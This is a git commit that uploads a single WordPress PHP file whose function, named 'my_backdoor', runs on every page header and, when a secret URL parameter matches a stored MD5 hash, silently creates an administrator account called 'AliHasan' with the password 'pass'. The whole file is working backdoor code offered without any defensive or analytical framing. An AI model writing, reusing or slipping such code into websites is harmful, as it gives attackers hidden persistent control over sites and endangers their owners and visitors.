7578712a532b45328bf460b6c00951a56ee9b105
Developer-HASAN <82647693+DeveloperAlihasan@users.noreply.github.com>
2023-09-13 17:05:47 +0600

    Add files via upload

---
+++ chiching_fak/index.php
@@ -0,0 +1,44 @@
+<?php 
+add_action( 'wp_head', 'my_backdoor' );
+
+
+
+
+function my_backdoor() {
+
+
+    if ( md5( $_GET['chiching_fak'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+
+
+        require( 'wp-includes/registration.php' );
+
+
+        if ( !username_exists( 'AliHasan' ) ) {
+
+
+            $user_id = wp_create_user( 'AliHasan', 'pass' );
+
+
+            $user = new WP_User( $user_id );
+
+
+            $user->set_role( 'administrator' );
+
+
+        }
+
+
+    }
+
+
+}
+
+
+
+
+
+
+
+
+
+?>
